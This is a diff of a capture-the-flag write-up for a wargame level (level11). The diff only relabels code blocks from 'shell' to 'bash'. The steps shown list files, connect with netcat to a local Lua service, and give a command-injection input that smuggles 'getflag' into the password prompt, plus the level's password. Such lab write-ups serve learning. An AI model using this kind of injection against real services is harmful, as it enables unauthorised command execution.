@@ -6,7 +6,7 @@ level11's password: `feulo4b72j7edeahuete3no7c`
 
 1. examinate existing files and permissions
 
-```shell
+```bash
 ls -la
 ```
 
@@ -14,7 +14,7 @@ shows a lua script that is supposed to run on 127.0.0.1:5151, with flag11 permis
 
 2. try to connect to it with netcat
 
-```shell
+```bash
 nc 127.0.0.1 5151
 ```
 
@@ -22,7 +22,7 @@ Asking for a password, as expected
 
 3. inject some code to trick the script to run getflag for us
 
-```shell
+```bash
 pwnd; getflag > /tmp/flag; echo pwnd
 cat /tmp/flag
 ```
